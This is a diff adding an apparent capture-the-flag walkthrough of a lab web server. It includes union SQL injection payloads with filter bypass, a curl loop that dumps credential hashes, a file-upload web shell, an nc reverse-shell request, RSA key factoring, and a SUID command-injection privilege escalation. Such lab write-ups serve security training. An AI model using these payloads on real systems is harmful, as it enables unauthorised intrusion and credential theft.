@@ -1,0 +1,298 @@
+1. Run nmap scan, notice port 22 and 80 is open examine with burp proxy. By going to the webpage we find out
+that the site is powered by SuperCMS, if we look online we may find a new version and look for security 
+patches.
+
+2. Next run gobuster and see what we can find. We navigate to one of the pages and we find a blog that seems
+to be using php and is feeding paramters to a php variable this may lead to a sql injection. What we do is
+with burp is interecept a request to one of the pages, save toa file and feed it to sqlmap.
+	sqlmap -r singlepost.req -p id
+
+Once we find it union injectable we can also dump the contents of the table.
+
+	sqlmap -r singlepost.req -p id --dump
+
+Remember that the dump reveals there are 5 columns in the table, this will come in handy later on.
+
+We get the contents but find nothing of use, next we will try to read from a file on the server if we can.
+	sqlmap -r singlepost.req -p id --file-read=/etc/passwd
+
+That however fails. We also try to execute commands as well. We select the default options. Trying to drop
+files on default locations. 
+	sqlmap -r singlepost.req -p id --os-cmd=ls
+
+That also fails. Maybe this is not sql injectable, low hanging fruit not working. 
+
+3. We go back to our results, and we find an interesting directory "cmsdata" we navigate to it however. We 
+get a 403 forbidden error. Next thing to do is run a gobuster on that directory and see what else we can 
+find we also append the "-x" option to see if we can find any additional files.
+	gobuster dir -u http://10.10.10.31/cmsdata/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o cms.txt -x php
+
+We are able to find a login.php file so we can now navigate to its location. 
+	http://10.10.10.31/cmsdata/login.php
+
+4. Next thing to do is try to authenitcate with basic credentials and interecpt the request via burp. Two
+other things we could have done is use hydra to try and brute force the login credentials or use sql map
+to try and check if it is potentially vulnerable. However the next best thing is to click the forgot 
+password link. We click on the link and notice that the field has to contain an "@" in order for it to work,
+if entered correctly it will shoot out a "User not found with that email!".
+
+If we append a "'" to the email we get a "Error in Database!", so we play around a little bit more.
+Adding the following request:
+	"email=asd@help.com' OR 1=1 ;-- -"
+Ultimately responds with "User not found with that email!"
+
+Next we google "mysql select syntax" to understand to pull information link:
+https://dev.mysql.com/doc/refman/8.0/en/select.html
+
+What are query most likely looks:
+SELECT username FROM users WHERE email == 'asdb@help.com' -- -'
+
+Next we will now attempt to run this with sqlmap. We will copy the request to a file and run it.
+	sqlmap -r forgot.req -p email --level 4 --risk 3 --batch
+
+This is for background enumeration.
+
+5. We will now methodically poke around and apply some basic sql commands such as applying a basic union
+injection. Remember we have 5 columns.
+
+Our inject ommand would look something like this:
+http://10.10.10.31/singlepost.php?id=10 UNION SELECT 1,2,3,4,5
+
+If we did something like this we would get no output because of wrong number of columns:
+http://10.10.10.31/singlepost.php?id=10 UNION SELECT 1,2,3
+
+Likewise if we change the id to something that is not eligible:
+http://10.10.10.31/singlepost.php?id=453 UNION SELECT 1,2,3,4,5
+
+We would now have complete control over the display, plug and play.
+
+So we could now output something like the version: 
+http://10.10.10.31/singlepost.php?id=453 UNION SELECT 1,2,3,4,version()
+The following is the output:
+
+"5.7.18-0ubuntu0.16.04.1
+3, 2
+
+4"
+
+6. We now go back to our original request with the email forgot link and apply the same method and see what
+the results lead to.
+	email=asd@help.com' UNION SELECT 1 -- -
+We get "error", this is different from the various other messages we have receieved leading us to believe
+there must be some sort of blacklist. So to test that out we apply the following:
+	email=%20UNION%20@help.com
+We entered spaces with the union command and realized it does. So next attempt is to try and change the 
+casing:
+	email=%20UNIoN%20@help.com
+
+It works! We can by pass filters by changing the case. So now what do we do? We keep appying union select
+statemtents and findout the number of columns.
+
+	email=asd@help.com' UNIoN SeLECT 1,2,3 -- -
+
+Eventually we get an "Incorrect format" message:
+	email=asd@help.com' UNIoN SeLECT 1,2,3,4 -- -
+
+We found the correct amount of fields however now we need to modify the format of each field so that it is 
+appropriate with the union statement.
+	email=asd@help.com' UNIoN SeLECT "asd@help.com",2,3,4 -- -
+We keep appying this to each field until we get a new message. This is because we believe the field should
+be an email:
+	email=asd@help.com' UNIoN SeLECT 1,2,3,"asd@help.com" -- -
+The following is the response: "Email sent to: asd@help.com=>2"
+
+We know that the query is returning 4 items and the last one is an email. We can control the output, but
+how do we get information back to us? For example:
+	email=asd@help.com' UNIoN SeLECT 1,2,version(),"asd@help.com" -- -
+We get nothing. What we will do is use "concat", this will allow to append or prepend information that can 
+be displayed on the email portion that is visible.
+
+7. We will now look for INFORMATON_SCHEMA table: , specifically the INFORMATION_SCHEMA COLUMNS Table.
+Website: https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
+3 Things we completely need to dump a databse are there: TABLE_SCHEMA, TABLE_NAME, and COLUMN_NAME.
+
+The request will look something like this:
+CONCAT(TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, "asdv@help.com")
+
+This will blend together so we will add a colon to separate them:
+CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, ":", "asdv@help.com")
+
+We send the following request via burp:
+	email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, ":", "asdv@help.com") FROM INFORMATION_SCHEMA.COLUMNS -- -
+
+This however fails again due to the fact that there might still be some filtering going on so we change the
+casing.
+	email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, ":", "asdv@help.com") FROM INFoRMATION_SCHEMA.COLUMNS -- -
+
+We get an "error" this maybe due to the fact that hundreds of rows/columns are returned thereby changing 
+them into arrays which will inevitably return a different type confusion. We need one row. so we do a limit.
+	email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, ":", "asdv@help.com") FROM INFoRMATION_SCHEMA.COLUMNS LIMIT 1-- -
+
+The output is a bit noisy so we have to further modify it.
+	email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, ":", "asdv@help.com") FROM INFoRMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != "InformatiOn_Schema"  LIMIT 1-- -
+
+And we get the following: "Email sent to: supercms:groups:grpid:asdv@help.com=>2 "
+which is the first column. 
+
+We will now apply an offset to the request to grab different columns:
+	email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, ":", "asdv@help.com") FROM INFoRMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != "InformatiOn_Schema"  LIMIT 1 OFFSET 1-- -
+
+So on and so forth, but we want to do is automate this so we will create a script and curl:
+for i in $(seq 0 100); do
+	payload="email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(TABLE_SCHEMA, ':', TABLE_NAME, ':', COLUMN_NAME, ':', 'asdv@help.com') FROM INFoRMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema'  LIMIT 1 OFFSET $i-- -"
+	#echo $payload
+	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@help.com'
+done
+
+
+OUTPUT:
+supercms:groups:grpid:asdv@help.com
+supercms:groups:userid:asdv@help.com
+supercms:license:id:asdv@help.com
+supercms:license:license_key:asdv@help.com
+supercms:operators:id:asdv@help.com
+supercms:operators:__username_:asdv@help.com
+supercms:operators:__password_:asdv@help.com
+supercms:operators:email:asdv@help.com
+
+The columns that are of interest are usernames and password, so we will dump them. Our request will now 
+change significantly with this new data.
+
+	email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(__username_, ":", __password_, ":", "asdv@help.com") FROM supercms.operators LIMIT 1 OFFSET 0-- -
+
+We get the follwoing which is an md5sum and user: "Email sent to: test1:5f4dcc3b5aa765d61d8327deb882cf99:asdv@help.com=>2 "
+
+The new script is the following: users.sh
+for i in $(seq 0 100); do
+	payload="email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(__username_, ':', __password_, ':', 'asdv@help.com') FROM supercms.operators LIMIT 1 OFFSET $i-- -"
+	#echo $payload
+	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@help.com'
+done
+
+The has for the users is the following: 5f4dcc3b5aa765d61d8327deb882cf99
+We need to dump more users to find the correct user and hash we need. So we up the sequence to 1000.
+We find the very last one:
+super_cms_adm:0b0689ba94f94533400f4decd87fa260:asdv@help.com
+decoder:5f4dcc3b5aa765d61d8327deb882cf99:asdv@help.com
+
+Now search for the md5sum: Decryption site https://www.md5online.org/md5-decrypt.html
+Found : tamarro
+
+So the user creds are: super_cms_adm:tamarro
+
+8. Next part is very ctf like. There is an option to upload a file and if we look at the source code of the
+page we find that there is base64 encode string:
+echo -n dGVzdGZpbGUx | base64 -d
+testfile1
+
+We then go to burp and modify options to intercept response as well. Take comments out.
+And change the hashedname to its original name: testfile1 
+<!-- <input type=hidden name="dGVzdGZpbGUx"> -->
+Everything should work now so that you can edit a parameter on the webpage which will be a filename.
+We submit the image and everything works, remember we had to submit an image that has the magic byte of GIF8
+Back to Main Success:../images/bak2stak.php 
+
+The image file can be found: /opt/shells/php/cmd.php.jpg
+
+We submit the follwoing and we can run commands via the following:
+http://10.10.10.31/images/bak2stak.php?bak=ls
+
+
+Use burp to url encode reverse shell:
+GET /images/bak2stak.php?bak=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.8+1234+>/tmp/f HTTP/1.1
+
+9. Now we have to pivot into the decoder user. we have to do some crypto stuff. We download an rsa toolkit 
+from github: git clone https://github.com/Ganapati/RsaCtfTool.git
+
+All we do now is plugin some values and done
+/opt/RsaCtfTool/RsaCtfTool.py --publickey decoder.pub --uncipherfile pass.crypt
+[+] Clear text : b'\x00\x02\x11\x96\xa91\xfb\x13\xd46\xba\x00nevermindthebollocks'
+
+The password being : nevermindthebollocks
+
+RSA is a lot of prime number factorization: Take a really big number and them find 2 different primes that when multiplied together equal that number.
+
+This a 256 bit key and is doable very quickly.
+
+To get the n for the key use the following in python:
+
+>>> from Crypto.PublicKey import RSA
+>>> f = open("decoder.pub", "r")
+>>> f = open("crypto/decoder.pub", "r")
+>>> key = RSA.importKey(f.read())
+>>> print key.n
+85161183100445121230463008656121855194098040675901982832345153586114585729131
+
+We can do this manually as well, install msieve instructions in following page:
+https://www.mersenneforum.org/showthread.php?t=23085
+
+We use msieve to calculate the primes: 
+./msieve 85161183100445121230463008656121855194098040675901982832345153586114585729131
+
+root@kali:~/Math/msieve# cat msieve.log | grep "factor:"
+Sun Feb  2 04:44:11 2020  p39 factor: 280651103481631199181053614640888768819
+Sun Feb  2 04:44:11 2020  p39 factor: 303441468941236417171803802700358403049
+
+We need the modular muliplicative inverse function python (google):
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise Exception('modular inverse does not exist')
+    else:
+        return x % m
+
+Once we have our script together, we can generate the private key:
+from Crypto.PublicKey import RSA
+
+n = 85161183100445121230463008656121855194098040675901982832345153586114585729131
+e = 65537
+p = 280651103481631199181053614640888768819
+q = 303441468941236417171803802700358403049
+m = n-(p+q-1)
+
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise Exception('modular inverse does not exist')
+    else:
+        return x % m
+
+d = modinv(e,m)
+key = RSA.construct((n,long(e),d,p,q))
+print key.exportKey()
+
+
+#######
+We should be able to know use openssl to decrypt the priv file:
+	openssl rsautl -decrypt -inkey decoder.priv < pass.crypt
+	nevermindthebollocks
+
+10. Once in as decoder we can try and look for suid binaries that maybe exploitable.
+We find a file going by the name "/usr/local/bin/supershell"
+We transfer the binary to our own computer and figure out what id does.
+We analyze the file with radare and realize that in order for the suid program to execute properly,
+"/bin/ls" has to be specified in its entirety. After which you can enter any commad and have it execute.
+Example:
+	/usr/local/bin/supershell "/bin/ls /\$(cat /root/root.txt)"
+	Supershell (very beta)
+	++[/bin/ls /$(cat /root/root.txt)]
+	/bin/ls: cannot access '/c59a840463acc6ca14f6599721c9c18e': No such file or directory
+
+To get a shell:
+	/usr/local/bin/supershell "/bin/ls /\$(chown root:root /home/decoder/shell)"
+	/usr/local/bin/supershell "/bin/ls /\$(chmod 4755 /home/decoder/shell)"
+	./shell
